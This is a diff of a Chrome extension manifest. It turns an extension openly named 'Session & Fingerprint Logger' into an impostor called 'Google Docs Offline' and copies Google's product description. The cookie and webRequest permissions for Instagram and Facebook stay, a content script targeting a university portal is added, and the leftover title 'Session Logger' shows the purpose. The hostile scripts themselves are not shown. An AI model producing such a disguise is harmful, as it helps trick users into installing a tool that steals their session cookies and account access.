@@ -1,22 +1,20 @@
 {
   "manifest_version": 3,
-  "name": "Session & Fingerprint Logger",
-  "version": "1.0",
-  "description": "Logs fingerprint, geolocation & session IDs from IG/FB/SC",
+  "name": "Google Docs Offline",
+  "version": "1.93.1",
+  "description": "Google Drive Offline lets you access, view, and edit your Google Docs, Sheets, and Slides without an internet connection.",
   "permissions": [
     "cookies",
     "webRequest",
     "webNavigation",
     "scripting",
     "storage",
-    "activeTab",
-    "geolocation"
+    "activeTab"
   ],
   "host_permissions": [
     "*://*.instagram.com/*",
     "*://*.facebook.com/*",
-    "*://*.snapchat.com/*",
-    "*://*/*"
+    "https://ums.lpu.in/*"
   ],
   "background": {
     "service_worker": "background.js",
@@ -24,11 +22,7 @@
   },
   "content_scripts": [
     {
-      "matches": [
-        "*://*.instagram.com/*",
-        "*://*.facebook.com/*",
-        "*://*.snapchat.com/*"
-      ],
+      "matches": ["https://ums.lpu.in/lpuums/*"],
       "js": ["content.js"],
       "run_at": "document_idle"
     }
@@ -38,6 +32,7 @@
     "default_title": "Session Logger"
   },
   "icons": {
+     "16": "icons/16.png",
     "48": "icons/48.png",
     "128": "icons/128.png"
   },
